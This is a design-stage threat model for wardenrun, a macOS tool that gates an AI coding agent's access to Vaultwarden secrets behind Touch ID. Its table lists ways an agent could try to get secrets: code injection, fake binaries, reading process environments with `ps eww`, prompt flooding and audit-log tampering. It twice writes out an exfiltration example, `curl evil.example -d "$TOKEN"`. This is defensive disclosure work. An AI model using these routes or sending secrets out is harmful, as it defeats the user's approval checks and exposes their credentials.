# Threat model

> **Pre-release.** wardenrun is not implemented yet. This document describes the approved
> design ([`DESIGN.md`](DESIGN.md), section 6). Each row below is a promise the code has to keep,
> not a description of shipped behaviour. It is updated in the same pull request as any change
> that touches a protection. Where it says *tested*, that means checked with a throwaway
> prototype on one macOS 15 machine (DESIGN section 3.1), not with the finished program.

Short version: wardenrun stops an AI agent from **quietly** getting a secret. It does not
stop you from approving something harmful, and it does not defend a Mac that is already
compromised. The rows marked **Not protected** are real gaps, listed on purpose.

## Who we defend against

An AI coding agent (or one that has been prompt-injected) that runs shell commands as **the
same macOS user as you**, without root. In practice it can:

- read any file you can read, and list running processes;
- run any program, set any environment variable, edit your dotfiles;
- run `bw` and `security` itself.

It cannot produce your fingerprint.

## What is being protected

1. The master password of the **dedicated** Vaultwarden account that wardenrun uses. It exists
   on disk (inside one keychain item) and, for a few seconds per run, in memory.
2. The values of the items in that account's one collection.
3. The `bw` session key and the `bw` profile directory that wardenrun keeps for itself.

## What the protection really is

wardenrun does not need a paid Apple Developer account, and that has a price.

- **The fingerprint check is enforced by wardenrun, not by macOS.** The operating system
  would only enforce a per-read fingerprint check for a keychain item with a biometric access
  control, and macOS grants that only to apps signed with a paid developer account (a
  restricted entitlement and a provisioning profile). A command-line tool cannot carry one.
- **What the OS does enforce:** the stored keychain item can be read only by a program signed
  with wardenrun's code-signing identity. A different certificate, an ad-hoc signature or an
  unsigned copy is refused by the keychain (tested).
- **What wardenrun enforces itself:** the Touch ID check, in its own code, hardened against
  code injection (hardened runtime, no debugger attach, no core dumps, refusal to start with
  `DYLD_*` set, secrets in locked and zeroed memory).
- This is the same level of protection that Bitwarden's own macOS desktop app uses for its
  biometric unlock: a Touch ID prompt in the app, then a read of an ordinary file-based
  keychain item (no OS-enforced biometric check).

Because the gate is not enforced by the OS, **the strongest control does not depend on macOS at
all**: wardenrun is meant for a dedicated low-privilege Vaultwarden account that belongs to
one organization and sees one collection. If everything stored on the Mac leaks, only that
collection is exposed, never your personal vault.

## The attacks, in plain language

| # | Attack | What happens | Why |
|---|--------|--------------|-----|
| 1 | The agent reads `.env` files, shell history or transcripts | Nothing to find | Secrets are never written there. Output is masked. The audit log holds names, never values. |
| 2 | The agent runs `bw`, or `security find-generic-password`, to read the vault or the stored password | Denied for the stored password (for `bw`'s own token file, see row 17) | The keychain item only opens for wardenrun's own signature. The `bw` session key is never saved. |
| 3 | The agent runs `wardenrun run X -- some command` | **You decide** | The Touch ID sheet shows the full command. Commands over 400 characters are denied, not shortened. One prompt at a time, 60 s timeout, lock-out after repeated refusals. |
| 4 | The agent fakes the approval | Not possible | There is no Approve button. The only way to say yes is the system Touch ID sheet. The password fallback is off by default. Without a screen session (ssh, cron) the answer is no. |
| 5 | The agent injects code into wardenrun (`DYLD_INSERT_LIBRARIES`, a debugger) | Blocked | Hardened runtime ignores `DYLD_INSERT_LIBRARIES` (tested), debugger attach is denied, and wardenrun refuses to start if `DYLD_*` is set. |
| 6 | The agent tricks wardenrun into running a fake `bw` (changed `PATH`, `NODE_OPTIONS`, edited config) to capture the master password | Blocked | `bw` is called by an absolute path whose identity (the code signature of Bitwarden's release, team `LTZ2PFU5D6`) is stored inside the protected keychain item. Homebrew's Node build of `bw` is refused: it loads code from a user-writable directory that no pin covers. Its environment is built from an allowlist. On the preferred path and on the pipe-based fallback, the master password is never in `bw`'s environment or command line (the last-resort fallback is row 16). |
| 7 | The agent replaces or aliases the `wardenrun` binary | **Not protected** | Install directories are writable by you, so the agent can too. A fake prompt can then phish a touch. `wardenrun doctor` (planned) is meant to check the signature and the install path, and the certificate hash will be published with the first release, but nothing forces you to look. |
| 8 | You approve a command that prints or sends the secret (`curl evil.example -d "$TOKEN"`, a script that logs it) | **Not protected** | This is why the sheet shows the whole command. Masking catches accidents (raw, base64, URL-encoded, hex, JSON-escaped, shell-quoted), not intent: reversing or splitting the value beats it. The sheet shows the command but not the environment the agent set, so it also tags risky variables (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`), and a program file you can write (`[writable exe]`), which could be swapped between the final check and the start. |
| 9 | While an approved command runs, the agent reads its environment with `ps eww` | **Not protected** for `--env` injection | Tested: ordinary programs leak their environment to the same user (Apple's own binaries do not). Use `--stdin` for tools that can read the secret from standard input. The temporary-file mode is readable by you while the file exists. |
| 10 | The agent floods you with prompts hoping for a careless yes | Mitigated | One pending prompt, a cool-down after refusals, every refusal in the audit log. |
| 11 | The agent edits the audit log | **Not protected** against a determined edit | Each line carries the hash of the previous one, which catches accidents and clumsy edits. The hash has no key, so a process of yours that knows the format can rewrite lines, drop the last ones or delete the file. |
| 12 | The agent reads the master password from wardenrun's memory | Mitigated | Memory is locked and zeroed after use, core dumps are off, debugger attach is denied. |
| 13 | The stored master password leaks | Damage limited | It belongs to a dedicated account that sees one collection (see above). |
| 14 | Someone impersonates your Vaultwarden server | Mitigated | `https://` is required (plain `http://` is refused by `bw`, even on loopback: tested) and `bw` verifies certificates. |
| 15 | The agent re-runs `wardenrun setup` to point it at its own server or account | Blocked | `setup` needs the master password typed by a human at a terminal, plus an approval that shows the old and new values. |
| 16 | During one approved run, the agent reads the master password or `BW_SESSION` from `bw`'s environment with `ps eww`, then decrypts the whole cached collection offline | **Not protected on the fallback paths** | wardenrun hands the password to `bw` in one of three ways, best first. The best way (a private socket) leaves neither secret in any environment or command line. The other two leave a secret visible for a few seconds. The path is chosen by a spike at the start of the `bw`-driver work; if the preferred path fails, the design is revised before more code is written, and the README says which one shipped. The exposure needs an agent polling `ps` at exactly that moment, and is limited to the one collection. |
| 17 | The agent reads the login tokens from wardenrun's `bw` profile (`~/.config/wardenrun/bw/data.json`, readable by you) and talks to Vaultwarden as the dedicated account | **Not protected** | `bw` keeps its tokens there in plain text. With them the agent can read the encrypted vault (guessing the master password offline is the next step) and change or delete items the account may write. Defences: a dedicated account, a long random master password, a read-only collection when `new` is not used, and an optional logout after every run. |
| 18 | The maintainer's signing key leaks, or a malicious release is published | **Not protected** for people who installed that release | A binary signed with the leaked key passes the keychain check and could read the stored password after one approval. Defences: the key lives in a CI secret plus one offline backup, releases carry a GitHub artifact attestation and published hashes, and there is a documented rotation (everyone re-runs `wardenrun setup`). You trust the maintainer here, as with any package. |

## Not protected, in plain words

These are the cases where wardenrun can **not** save you. They are deliberate disclosures,
not oversights.

- **A swapped wardenrun binary** (row 7). If something replaces the program you think you are
  running, its prompt looks real. Verify the install ([`README.md`](../README.md#verify-dont-trust)).
- **A command you approved** (row 8). wardenrun shows you the command; it cannot tell whether
  the command is safe. If you approve `curl evil.example -d "$TOKEN"`, the secret leaves. The
  same goes for a script you can edit: it is hashed and re-checked just before it starts, but a
  process of yours that can write it could change it in the last instant.
- **The audit log** (row 11). Anything running as you can rewrite or cut it. Treat it as a
  convenience record, not as evidence.
- **Secrets in a program's environment** (row 9). While the program runs, other processes of
  your user can read its environment. Prefer `--stdin`.
- **`bw`'s own secrets on the fallback paths** (row 16), and **its login tokens on disk**
  (row 17). These come from how the official `bw` CLI works. The dedicated account, the long
  random master password and the single collection are what bound the damage.
- **The maintainer's key** (row 18). A leaked signing key lets an attacker build a binary the
  keychain accepts.

## Out of scope

- Root access or malware already running on your Mac.
- A user who approves without reading the prompt.
- A physically stolen, unlocked Mac.
- The security of Vaultwarden and of the `bw` CLI themselves.
- Linux and Windows (not built; the platform-specific code is isolated behind three
  protocols so a port is possible, but it needs its own design).

## Reporting a problem

See [`SECURITY.md`](../SECURITY.md).
